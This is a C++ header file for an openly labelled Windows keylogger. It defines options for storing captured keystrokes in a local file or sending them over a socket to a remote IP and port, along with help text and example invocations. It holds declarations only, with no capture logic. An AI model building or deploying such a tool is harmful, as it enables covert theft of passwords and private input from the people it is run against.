#ifndef _MAIN_HPP_
#define _MAIN_HPP_

#include <winsock2.h>
#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <string>
#include <cstring>
#include <cstddef>
#include <sstream>

#define DEFAULT_IP_VALUE "127.0.0.1"
#define DEFAULT_PORT_VALUE 7777

#define DEFAULT_FILE_PATH "D:/temp.txt"

#define LONG_OPTION_LOCAL "local"
#define LONG_OPTION_FILE_PATH "file_path"
#define LONG_OPTION_REMOTE "remote"
#define LONG_OPTION_NO_ARROW "no_arrow"
#define LONG_OPTION_NO_CLICK "no_click"
#define LONG_OPTION_ASCII_ONLY "ascii_only"
#define LONG_OPTION_MAXIMUM_BUFFER_SIZE "maximum_buffer_size"
#define LONG_OPTION_HELP "help"

#define SHORT_OPTION_LOCAL 'l'
#define SHORT_OPTION_REMOTE 'r'
#define SHORT_OPTION_NO_ARROW 'a'
#define SHORT_OPTION_NO_CLICK 'c'
#define SHORT_OPTION_ASCII_ONLY 'A'
#define SHORT_OPTION_MAXIMUM_BUFFER_SIZE 'm'
#define SHORT_OPTION_HELP 'h'

#define HELP_MESSAGE "Keylogger options : "
#define HELP_MESSAGE_LOCAL "\t-l | --local : local keylogger, store data into file on this computer, require 1 argument (destination path)"
#define HELP_MESSAGE_LOCAL_EXAMPLE "\t\tExample : ./bin/main.exe -l D:\\file.txt"
#define HELP_MESSAGE_REMOTE "\t-r | --remote : remote keylogger, send data via socket, require 2 arguments (ip, port)"
#define HELP_MESSAGE_REMOTE_EXAMPLE "\t\tExample : ./bin/main.exe -r 192.168.1.16 7777"
#define HELP_MESSAGE_HELP "\t-h | --help : print this help"
#define HELP_MESSAGE_HELP_EXAMPLE "\t\tExample : ./bin/main.exe -h"

#define ERROR_MESSAGE_SETCONTROLECTRLHANDLER "error SetConsoleCtrlHandler "

#define NO_ERROR 0

#include "./keylogger/keylogger.cpp"
#include "./keylogger/keylogger_local/keylogger_local.cpp"
#include "./keylogger/keylogger_remote/keylogger_remote.cpp"

extern string* g_file_path;

extern string* g_ip;
extern int g_port;

extern keylogger* g_keylogger;

/*
* Print all possible parameters of this program
*/
void print_help();

/*
* Initialize the keylogger with options
*/
void initialize_options(int, char**);

int main(int, char**);

#endif
